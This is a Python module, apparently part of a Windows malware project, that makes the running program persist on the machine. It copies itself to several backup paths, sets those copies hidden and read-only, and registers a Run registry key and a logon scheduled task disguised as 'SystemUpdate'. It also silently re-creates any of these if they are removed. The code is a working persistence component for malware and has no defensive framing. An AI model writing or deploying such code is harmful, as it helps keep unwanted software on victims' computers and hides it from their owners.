import os
import shutil
import winreg
import subprocess
import sys
from core.config import BACKUP_PATHS
from core.helpers import set_hidden_readonly

def create_backups():
    current = os.path.abspath(sys.argv[0])
    for dest in BACKUP_PATHS:
        dest_dir = os.path.dirname(dest)
        if not os.path.exists(dest_dir):
            try:
                os.makedirs(dest_dir, exist_ok=True)
            except:
                continue
        try:
            shutil.copy2(current, dest)
            set_hidden_readonly(dest)
        except:
            pass
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE) as k:
            winreg.SetValueEx(k, "SystemUpdate", 0, winreg.REG_SZ, f'"{sys.executable}" "{dest}"')
    except:
        pass
    try:
        subprocess.run(['schtasks', '/create', '/tn', 'SystemUpdateTask', '/tr', f'"{sys.executable}" "{dest}"', '/sc', 'onlogon', '/f'], capture_output=True)
    except:
        pass

def ensure_persistence():
    existing = [p for p in BACKUP_PATHS if os.path.exists(p)]
    if not existing:
        create_backups()
        return
    src = existing[0]
    for dest in BACKUP_PATHS:
        if not os.path.exists(dest):
            try:
                shutil.copy2(src, dest)
                set_hidden_readonly(dest)
            except:
                pass
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_QUERY_VALUE) as k:
            val, _ = winreg.QueryValueEx(k, "SystemUpdate")
            if BACKUP_PATHS[0] not in val:
                raise
    except:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE) as k:
            winreg.SetValueEx(k, "SystemUpdate", 0, winreg.REG_SZ, f'"{sys.executable}" "{BACKUP_PATHS[0]}"')
    result = subprocess.run(['schtasks', '/query', '/tn', 'SystemUpdateTask'], capture_output=True)
    if result.returncode != 0:
        subprocess.run(['schtasks', '/create', '/tn', 'SystemUpdateTask', '/tr', f'"{sys.executable}" "{BACKUP_PATHS[0]}"', '/sc', 'onlogon', '/f'], capture_output=True)